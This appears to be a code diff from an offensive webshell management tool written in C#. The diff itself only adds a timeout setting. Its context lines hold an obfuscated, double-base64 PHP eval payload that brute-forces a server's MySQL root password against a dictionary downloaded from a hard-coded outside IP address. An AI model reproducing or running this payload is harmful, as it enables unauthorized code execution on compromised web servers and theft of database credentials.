@@ -165,6 +165,7 @@ namespace C2.Business.CastleBravo.WebShellTool
         }
 
         /*<--静态变量复制先后顺序不能改变-->*/
+        public static string MysqlTimeout = "120";
         public static string MysqlAccount = "root";
         public static string MysqlDictAddr = "http://103.43.17.9/wk/db_dict";
         public static string MysqlPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_POST[0])));&0=YzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3YVdZb0lXbHpjMlYwS0NSZlVrVlJWVVZUVkZzeFhTa3BaWGhwZENncE93MEtKSEk5YVhOelpYUW9KRjlTUlZGVlJWTlVXekpkS1Q4a1gxSkZVVlZGVTFSYk1sMDZJbkp2YjNRaU93MEtKSEE5Wm1sc1pTaEFZbUZ6WlRZMFgyUmxZMjlrWlNna1gxSkZVVlZGVTFSYk1WMHBLVHNnRFFwbWIzSW9KR2s5TURza2FUeGpiM1Z1ZENna2NDazdKR2tyS3lsN2FXWW9ZM1FvSkhJc2RISnBiU2h6ZEhKZmNtVndiR0ZqWlNoUVNGQmZSVTlNTENjbkxDUndXeVJwWFNrcEtTbDdaWGhwZENncE8zMW1iSFZ6YUNncE8zMWxZMmh2SUNKUlFVTkxURE5KVHpsUVBUMU9iM1FnUm1sdVpDQlFZWE56ZDI5eVpEMDlVVUZEUzB3elNVODVVQ0k3RFFwbWRXNWpkR2x2YmlCamRDZ2tjaXdrY0NsN0pHTTlRRzE1YzNGc1gyTnZibTVsWTNRb0lteHZZMkZzYUc5emRDSXNKSElzSkhBcE8ybG1LQ1JqS1h0bFkyaHZJQ0pSUVVOTFRETkpUemxRUFQxRGNtRmphMlZrSUhOMVkyTmxjM05tZFd4c2VTd2djR0Z6YzNkdmNtUWdPaUl1SkhBdUlqMDlVVUZEUzB3elNVODVVQ0k3Y21WMGRYSnVJSFJ5ZFdVN2ZXVnNjMlY3Y21WMGRYSnVJR1poYkhObE8zMTk=&1=" + ST.EncodeBase64(ClientSetting.MysqlDictAddr) + "&2=" + ClientSetting.MysqlAccount;
